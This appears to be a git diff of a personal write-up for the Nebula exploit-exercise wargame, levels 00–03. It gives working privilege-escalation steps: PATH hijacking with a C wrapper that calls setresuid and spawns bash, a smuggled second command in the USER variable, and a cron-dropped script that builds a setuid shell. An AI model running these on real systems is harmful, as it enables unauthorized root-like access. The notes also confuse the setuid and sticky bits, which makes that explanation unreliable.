@@ -1,5 +1,7 @@
 Nebula Exec:
 
+The purpose of every (AFAIK) exercise is to run the command `getflag`
+as the user flagXX.
 
 ### Level00:
 
@@ -17,8 +19,8 @@ With the user id number use the comand find to find a file
 ```
 find / -uid 999
 ```
-
-Run the file and follow the instructions.
+The file which we need to find is `/rofs/bin/.../flag00`, when we run this exe
+we get a shell with the user `flag00`, now we can run the command `getflag`.
 
 
 ### Level01
@@ -54,14 +56,20 @@ path.
 The quiz asks to find how to use the executable to execute any program.
 Here is my solution:
 ```
-$ cat > ~/echo
-#!/usr/bin/bash
-dmesg
+$ cat > ~/echo.c
+#include <unistd.h>
+main()
+{
+  setresgid(998, 998, 998); // here we use the flag01 uid and gid
+  setresuid(998, 998, 998);
+  system("/bin/bash");
+  0==0;
+}
 ^D
-$ chmod +x ~/echo
+$ gcc echo.c -o echo
 $ PATH=/home/level01/:$PATH
-$ /home/flag01/flag01
-echo and now what? [   0.0000] microcode ....
+$ ./flag01
+$ ./getflag
 ```
 
 What we are doing is to use the fact that env takes the environment variables
@@ -111,12 +119,21 @@ as it is well formed.
 Solution:
 
 ```
-$ USER="msg && ls && echo"
+$ cat > ~/create_shell.c
+#include <unistd.h>
+main()
+{
+  setresgid(997, 997, 997); // here we use the flag02 uid and gid
+  setresuid(997, 997, 997);
+  system("/bin/bash");
+  0==0;
+}
+^D
+$ gcc create_shell.c -o create_shell
+$ USER="msg && create_shell"
+$ PATH=/home/level02/:$PATH
 $ ./flag02
-about to call system("/bin/echo msg && ls && echo is cool")
-xx
-flag02 <- our output
-is cool
+$ /bin/getflag
 ```
 
 the ls command can be replaced by our shell or any other command. For example we
@@ -131,3 +148,36 @@ $ ./flag02
 
 Check the files in /home/flag03. There is a crontab that is called every couplpe
 of minutes.
+For this we need to check crontab to see which jobs are scheduled.
+
+There is no description of what is the target for this level, but a search shows
+that the target of this level is to execute a bash as the user `flag03`.
+
+For this we can use the calls to `setresuid` and `setresgid` and also the
+sticky bit which allows to run the program as the user who created it, not as
+the user executing the file.
+
+The solution:
+
+```
+$ cat > runme.c
+#include <unistd.h> main() {
+  setresgid(996,996,996);
+  setresuid(996,996,996);
+   system("/bin/bash");
+    0==0;}
+^D
+cp runme.c /tmp
+```
+Now we need the cron job to compile and create an executable for us which will
+create a shell for us.
+```
+#!/bin/bash
+gcc /tmp/runme.c -o /home/flag03/shell_flag
+chmod +sx /home/flag03/shell_flag
+```
+
+Make the last schipt executable and add it to the `writable.d` directory.
+Thi will generate an executable with the sticky bit, which will run the program
+with the id of the flag03 user, and will create a shell for us. There we can
+`getflag`.
